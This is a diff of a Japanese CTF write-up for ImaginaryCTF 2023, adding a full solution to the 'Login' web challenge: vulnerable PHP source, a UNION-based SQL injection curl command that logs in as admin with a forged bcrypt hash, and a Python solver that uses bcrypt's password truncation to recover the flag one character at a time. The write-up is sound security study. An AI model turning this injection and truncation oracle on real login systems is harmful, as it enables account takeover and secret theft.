@@ -6,14 +6,13 @@ ImaginaryCTF 2023（<https://ctftime.org/event/2015>）に参加しました。
 チーム0nePaddingで参加しましたが、用事があってちょっとしか参加できなかったです。  
 後、簡単な問題しかやってません。
 
-- Web
-  - [Idoriot](#idoriot)
-  - [perfect_picture](#perfect_picture)
-  - [blank](#blank)
-  - [idoriot-revenge](#idoriot-revenge)
+- [web/Idoriot](#idoriot)
+- [web/perfect_picture](#perfect_picture)
+- [web/blank](#blank)
+- [web/idoriot-revenge](#idoriot-revenge)
 
-- Web(未完)
-  - [Login](#login)
+- 競技後に解いた問題
+  - [web/Login](#login)
 
 ## Idoriot
 
@@ -307,24 +306,136 @@ highlight_file(__FILE__);
 ictf{this_ch4lleng3_creator_1s_really_an_idoriot}
 ```
 
-以下競技中は解けなかった問題です。
-
 ## Login
 
-adminでのログインはできてmagicの値は取得できたが、時間がなくてフラグを取得できなかった。
+以下、競技中は解けなかった問題。  
+adminでのログインはできてmagicの値は取得できたが、時間がなくてフラグを取得できなかった。  
 問題のソースコードがあるのも気づかなかった。
 
 - 問題ソースコード
 
-/?sourceにアクセスすることで確認できたらしいです。  
+/?sourceにアクセスすることで確認できたらしい。  
 確かにHTMLソース内にコメントアウトされていた。
 
+```php
+<?php
+
+if (isset($_GET['source'])) {
+    highlight_file(__FILE__);
+    die();
+}
+
+$flag = $_ENV['FLAG'] ?? 'jctf{test_flag}';
+$magic = $_ENV['MAGIC'] ?? 'aabbccdd11223344';
+$db = new SQLite3('/db.sqlite3');
+
+$username = $_POST['username'] ?? '';
+$password = $_POST['password'] ?? '';
+$msg = '';
+
+if (isset($_GET[$magic])) {
+    $password .= $flag;
+}
+
+if ($username && $password) {
+    $res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = '$username'", true);
+    if (!$res) {
+        $msg = "Invalid username or password";
+    } else if (password_verify($password, $res['pwhash'])) {
+        $u = htmlentities($res['username']);
+        $msg = "Welcome $u! But there is no flag here :P";
+        if ($res['username'] === 'admin') {
+            $msg .= "<!-- magic: $magic -->";
+        }
+    } else {
+        $msg = "Invalid username or password";
+    }
+}
+?>
+<SNIP>
+```
+
 usernameでSQLインジェクションができる。  
-サーバからのレスポンスにSQLエラーが含まれるため、そこから判別していく。
+フラグは、GETパラメータに正しいmagicを付けることで入力したパスワードの後ろに結合された後、password_verify関数に渡されている。
 
-`username=admin'group+by+3;--+-&password=test`
+まずはmagicの値を取得する。  
+UNION句を使うことで簡単にadminとしてログインはできる。  
+パスワードハッシュはphpのpassword_hash関数で生成すれば良さそう。
 
-```html
-<br />
-<b>Warning</b>:  SQLite3::querySingle(): Unable to prepare statement: 1, 1st GROUP BY term out of range - should be between 1 and 2 in <b>/var/www/html/index.php</b> on line <b>21</b>
+```sh
+$ php -r "echo password_hash('test', PASSWORD_DEFAULT);"
+$2y$10$XmEkdpBqwnMU/0jXzLA3q.nX1io/A5Y24G9E9GN1TIAiqOEIjIydu
+```
+
+```sh
+curl -X POST http://login.chal.imaginaryctf.org/  --data-urlencode $'username=\'union select \'admin\',\'$2y$10$XmEkdpBqwnMU/0jXzLA3q.nX1io/A5Y24G9E9GN1TIAiqOEIjIydu\';-- -' -d "password=test" -s | grep magic
+            Welcome admin! But there is no flag here :P<!-- magic: 688a35c685a7a654abc80f8e123ad9f0 -->        </p>
+```
+
+- magicの値が`688a35c685a7a654abc80f8e123ad9f0`だということが分かった。
+
+次にパスワードの後ろにフラグが結合されるため、password_verify関数で判別する必要がある。  
+また、`username=admin&password[]=test`等でSQLエラーを発生すると、レスポンスに`$2y$10$Is00vB1h...`が出力されることから、パスワードにはBcryptが使われていると推測できる。  
+Bcryptの場合は、password_verify時にパスワードが73文字以降は切り捨てられるため、差分で確認が可能。
+
+- <https://www.php.net/manual/ja/function.password-hash.php#refsect1-function.password-hash-parameters>
+
+例えば、passwordにAを71文字入力すると、フラグが後ろに付与されるため、`AAA...AAAictf{...`のような文字列になるが、password_verifyで確認されるパスワードは`AAA..AAAi`が確認される。  
+ここまで分かれば、後はその値のハッシュが正しくなるまで一文字ずつ総当たりすれば良い。
+
+- solver.py
+
+```py:solver.py
+#!/usr/local/bin/python
+import requests
+import bcrypt
+
+TARGET = "http://login.chal.imaginaryctf.org/"
+KEYS = list("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWZ .:,~^)(=-_&@#!\"$%?}{")
+SALT = bcrypt.gensalt(rounds=10, prefix=b'2b')
+
+def search(flag: str = ""):
+  print(flag)
+  for key in KEYS:
+    offset = "A" * (71 - len(flag))
+    hash = bcrypt.hashpw((offset + flag + key).encode(), SALT).decode()
+    payload = {
+      "username": f"'union select 'admin','{hash}';-- -", 
+      "password": offset
+    }
+    result = requests.post(f'{TARGET}?688a35c685a7a654abc80f8e123ad9f0', data=payload)
+    # print(result.request.body)
+    if "Welcome admin!" in result.text:
+      return search(flag + key)
+  return flag
+
+print(f"flag={search()}")
+```
+
+```sh
+$ python solver.py 
+
+i
+ic
+ict
+ictf
+ictf{
+ictf{w
+ictf{wh
+ictf{why
+ictf{why_
+<SNIP>
+ictf{why_are_bcrypt_truncating_my_passwor
+ictf{why_are_bcrypt_truncating_my_password
+ictf{why_are_bcrypt_truncating_my_passwords
+ictf{why_are_bcrypt_truncating_my_passwords?
+ictf{why_are_bcrypt_truncating_my_passwords?!
+ictf{why_are_bcrypt_truncating_my_passwords?!}
+flag=ictf{why_are_bcrypt_truncating_my_passwords?!}
+```
+
+- フラグ
+
+```text
+ictf{why_are_bcrypt_truncating_my_passwords?!}
 ```
